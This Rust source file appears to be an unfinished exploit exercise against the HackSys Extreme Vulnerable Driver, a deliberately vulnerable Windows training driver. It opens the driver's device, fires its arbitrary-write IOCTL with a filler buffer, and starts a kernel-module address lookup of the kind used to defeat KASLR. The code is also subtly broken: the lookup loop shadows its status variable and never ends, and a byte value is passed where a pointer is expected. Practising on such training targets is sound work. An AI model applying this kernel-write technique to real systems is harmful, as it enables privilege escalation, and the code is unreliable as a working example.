mod util;
use std::ffi::c_void;

use util::IOCTL_ARBITRARY_WRITE;
use util::SYSTEM_MODULE_INFORMATION;
use windows::core::w;
use windows::Win32::Foundation::{HANDLE, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use windows::Win32::Storage::FileSystem::CreateFileW;
use windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CREATE_ALWAYS, OPEN_EXISTING};
use windows::Win32::Storage::FileSystem::{
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows::Win32::System::IO::DeviceIoControl;
use windows::Wdk::System::SystemInformation::NtQuerySystemInformation;
use windows::Win32::Foundation::STATUS_INFO_LENGTH_MISMATCH;

pub unsafe fn contact_driver() -> HANDLE {
    let device_name = w!("\\\\.\\HackSysExtremeVulnerableDriver");
    let handle = CreateFileW(
        device_name,
        FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        HANDLE(0 as *mut c_void),
    );

    match handle {
        Ok(handle) => handle,
        Err(error) => {
            println!("Error: {:?}", error);
            HANDLE(0 as *mut c_void)
        }
    }
}

unsafe fn hevd_arbitrary_write(driver_handle: HANDLE) {
    let mut buffer: [u8; 16] = [0x41; 16];

    let result = DeviceIoControl(
        driver_handle,
        IOCTL_ARBITRARY_WRITE,
        Some(buffer.as_mut_ptr() as *mut c_void),
        0,
        None,
        0,
        None,
        None,
    );
}


unsafe fn GetKernelModuleAddress(module_name:&str) {
    let buffer = [0u8; 0x00];
    let mut size :usize = 0x00;
    let mut bytes_returned = 0u32;
    println!("pointer: {:?}", buffer.as_ptr());
    let status = NtQuerySystemInformation(
        SYSTEM_MODULE_INFORMATION,
        buffer.as_ptr() as *mut c_void,
        buffer.len() as u32,
        &mut bytes_returned,
    );
    
    while status != STATUS_SUCCESS {
        let size = bytes_returned as usize;
        let buffer = vec![0u8; (bytes_returned + 0x100) as usize];
        
        let status = NtQuerySystemInformation(
            SYSTEM_MODULE_INFORMATION,
            *buffer.as_ptr() as *mut c_void,
            buffer.len() as u32,
            &mut bytes_returned,
        );
        println!("Status: {:?}", status);
    }
    println!("Bytes returned: {}", bytes_returned);
}

fn main() {
    unsafe {
        let driver_handle = contact_driver();
        if driver_handle.0 == 0 as *mut c_void {
            println!("Failed to get driver handle");
            return;
        }

        hevd_arbitrary_write(driver_handle);
        GetKernelModuleAddress("hello");
    }
}
